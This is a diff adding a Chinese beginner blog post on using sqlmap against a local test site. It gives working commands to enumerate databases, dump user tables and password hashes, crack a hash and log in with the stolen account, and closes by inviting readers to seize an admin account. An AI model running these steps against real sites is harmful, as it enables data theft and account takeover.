@@ -1,0 +1,197 @@
+---
+layout: post
+title: 渗透测试工具sqlmap基础教程
+excerpt: 对于网络安全人员来说，掌握渗透工具的使用方法是一项必备的技能。然而，一个没有师傅带领的小白在刚开始学习时，并不知道该如何入手进行渗透学习，所以本文旨在帮助这些小白入门。
+---
+
+本文仅献给想学习渗透测试的sqlmap小白，大牛请绕过。
+
+对于网络安全人员来说，掌握渗透工具的使用方法是一项必备的技能。然而，一个没有师傅带领的小白在刚开始学习时，并不知道该如何入手进行渗透学习，所以本文旨在帮助这些小白入门。
+
+sqlmap是一款非常强大的开源sql自动化注入工具，可以用来检测和利用sql注入漏洞。它由python语言开发而成，因此运行需要安装python环境。
+
+既然本文是基础教程，以下只写工具的基本使用方法。
+
+本教程为sqlmap具体应用案例，如需了解更多sqlmap资料可以访问官方[http://sqlmap.org](http://sqlmap.org/) ，或者乌云知识库[http://drops.wooyun.org/tips/401](http://drops.wooyun.org/tips/401) 和 [http://drops.wooyun.org/tips/143](http://drops.wooyun.org/tips/143) 。
+
+测试环境：本地搭建的具有sql注入点的网站 http://192.168.1.150
+
+注意：sqlmap只是用来检测和利用sql注入点的，并不能扫描出网站有哪些漏洞，使用前请先使用扫描工具扫出sql注入点。
+
+教程开始：
+
+# 一、检测注入点是否可用
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134"
+```
+
+参数：
+
+-u：指定注入点url
+
+结果：
+
+![](http://img.blog.csdn.net/20141112094430265?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+![](http://img.blog.csdn.net/20141112094424665?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+注入结果展示：
+
+（1）注入参数id为GET注入，注入类型有四种分别为：boolean-based blind、error-based、stacked queries、inline query。
+
+（2）web服务器系统为windows 2003 or XP
+
+（3）web应用程序技术为：ASP.NET, Microsoft IIS 6.0
+
+（4）数据库类型为：SQLSERVER 2000
+
+其中图一有若干询问语句，需要用户输入[Y/N]，如果你懒得输入或者不懂怎么输入可以让程序自动输入，只需添加一个参数即可，命令如下：
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --batch
+```
+
+# 二、暴库
+
+一条命令即可曝出该sqlserver中所有数据库名称，命令如下：
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --dbs
+```
+
+参数：
+
+--dbs：dbs前面有两条杠，请看清楚。
+
+结果：
+
+![](http://img.blog.csdn.net/20141112095337826?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+结果显示该sqlserver中共包含7个可用的数据库。
+
+# 三、web当前使用的数据库
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --current-db
+```
+
+![](http://img.blog.csdn.net/20141112095451193?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+# 四、web数据库使用账户
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --current-user
+```
+
+![](http://img.blog.csdn.net/20141112095616026?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+# 五、列出sqlserver所有用户
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --users
+```
+
+![](http://img.blog.csdn.net/20141112095721703?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+# 六、数据库账户与密码
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --passwords
+```
+
+![](http://img.blog.csdn.net/20141112095814696?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+# 七、列出数据库中的表
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D tourdata --tables
+```
+
+参数：
+
+-D：指定数据库名称
+
+--tables：列出表
+
+结果：
+
+![](http://img.blog.csdn.net/20141112095947906?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+结果体现共列出了34张表。
+
+# 八、列出表中字段
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D tourdata -T userb --columns
+```
+
+参数：
+
+-D：指定数据库名称
+
+-T：指定要列出字段的表
+
+--columns：指定列出字段
+
+结果：
+
+![](http://img.blog.csdn.net/20141112100059292?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+结果显示该userb表中包含了23条字段。
+
+# 九、暴字段内容
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D tourdata -T userb -C "email,Username,userpassword" --dump
+```
+
+参数：
+
+-C ：指定要暴的字段
+
+--dump：将结果导出
+
+结果：
+
+![](http://img.blog.csdn.net/20141112100336680?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+如果字段内容太多，需要花费很多时间。可以指定导出特定范围的字段内容，命令如下：
+
+```
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D tourdata -T userb -C "email,Username,userpassword" --start 1 --stop 10 --dump
+```
+
+参数：
+
+--start：指定开始的行
+
+--stop：指定结束的行
+
+此条命令的含义为：导出数据库tourdata中的表userb中的字段(email,Username,userpassword)中的第1到第10行的数据内容。
+
+结果如下：
+
+![](http://img.blog.csdn.net/20141112100610793?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+# 十、验证结果
+
+通过上图结果看到其中的一个用户信息为：
+
+email：123456@qq.com
+
+username: 1.asp
+
+password: 49ba59abbe56e057
+
+通过md5解密，得到该hash的原文密码为：123456
+
+拿到账号密码我们来测试是否可以登录，登录结果如下：
+
+![](http://img.blog.csdn.net/20141112101002734?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvemd5dWxvbmdmZWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
+
+验证成功！
+
+当然我们只是拿到普通会员账号进行登录，你也可以拿到管理员账号进行登录，后面的事情自己发挥吧，嘿嘿！
+
+转自：http://blog.csdn.net/zgyulongfei/article/details/41017493
